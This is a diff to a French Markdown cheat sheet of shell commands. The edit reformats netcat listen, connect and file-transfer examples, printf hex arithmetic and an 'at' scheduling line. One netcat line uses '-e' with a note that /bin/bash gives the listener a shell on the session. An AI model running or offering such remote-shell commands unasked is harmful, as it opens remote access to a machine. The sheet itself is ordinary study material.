@@ -140,30 +140,29 @@ whoami : affiche l'utilisateur courant
 
 Attendre une connexion :
 
-- nc -lvp portnumber
+- `nc -lvp portnumber`
 
 Se connecter :
 
-- nc address portnumber
+- `nc address portnumber`
 
 Executer un fichier quand on se connecte :
 
-- nc address portnumber -e filename (on peut mettre /bin/bash pour que le listener puisse executer un shell sur ta session)
+- `nc address portnumber -e filename` (on peut mettre /bin/bash pour que le listener puisse executer un shell sur ta session)
 
 Charger un fichier text vers un fichier text distant :
 
-- Dans la sessions listener : nc -lvp portnumber > filetarget.txt
-- Dans la session connector : nc address portnumber < contentfile.txt
+- Dans la sessions listener : `nc -lvp portnumber > filetarget.txt`
+- Dans la session connector : `nc address portnumber < contentfile.txt`
 - Le contenu du contentfile.txt ira dans filetarget.txt
 
 **Opérations mathématiques dans un shell**
 - `printf "%x\n" $((0x7fffffffda70 - 0x24))`
 - `printf "%d\n" 0x1f  `
 - `printf "%020x" 123` Converti la valeur 123 en hex sur 20 bit
-- `printf "%d\n" 0xFF
+- `printf "%d\n" 0xFF`
 
 Programmer une tâche ponctuelle
-`at now + 20 minutes
-`> firefox` lance firefox dans 20 minutes
+`at now + 20 minutes > firefox` lance firefox dans 20 minutes
 
 
